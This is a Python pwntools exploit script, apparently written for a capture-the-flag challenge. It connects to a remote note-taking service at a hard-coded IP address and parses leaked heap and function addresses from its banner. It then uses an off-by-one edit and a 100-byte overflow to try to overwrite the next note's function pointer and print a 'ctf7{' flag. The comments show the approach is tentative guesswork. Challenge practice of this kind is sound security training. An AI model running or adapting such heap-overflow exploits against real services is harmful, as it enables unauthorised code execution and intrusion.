#!/usr/bin/env python3
"""
Maybe the hook is stored in a note's metadata?
Let's try to overwrite it directly using off-by-one
"""
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap:  0x{heap:x}")
log.success(f"win(): 0x{win:x}")
log.success(f"hook:  0x{hook:x}")

# New theory: Maybe each note has a function pointer that gets called
# Let's try to overflow from one note into another note's function pointer

print("\n[1] Create note 0")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'32')
io.recvuntil(b':')
io.sendline(b'A' * 32)
io.recvuntil(b'>')

print("[2] Create note 1")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'32')
io.recvuntil(b':')
io.sendline(b'B' * 32)
io.recvuntil(b'>')

print("[3] Edit note 0 - append exactly 1 byte to trigger off-by-one")
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
# Append 1 byte - this writes 33 bytes total into 32-byte buffer
io.sendline(b'X')
io.recvuntil(b'>')

print("[4] Edit note 0 again - append more to overflow into note 1")
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
# Append enough to reach note 1's metadata and overwrite function pointer
# We need to overflow: remaining space + chunk header + note 1 data + reach function pointer
payload = b'Y' * 100  # Large overflow
io.sendline(payload)
io.recvuntil(b'>', timeout=2)

print("[5] Try to trigger by printing note 1")
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'1')

output = io.recvall(timeout=3)
result = output.decode(errors='ignore')

print("\n" + "="*60)
print(result)
print("="*60)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        log.success(f"FLAG: {flag.group(0)}")

io.close()
